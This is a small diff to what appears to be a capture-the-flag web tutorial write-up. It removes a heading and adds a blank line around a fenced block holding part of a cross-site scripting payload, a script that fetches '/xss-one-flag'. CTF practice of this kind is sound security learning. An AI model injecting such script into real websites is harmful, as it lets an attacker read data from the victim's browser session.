@@ -10,8 +10,6 @@ description: |
 tags: ["web"]
 ---
 
-# web-tutorial-1 (web)
-
 ```html
 <script>
   fetch("/xss-one-flag")
@@ -22,4 +20,5 @@ tags: ["web"]
       );
     });
 </script>
+
 ```
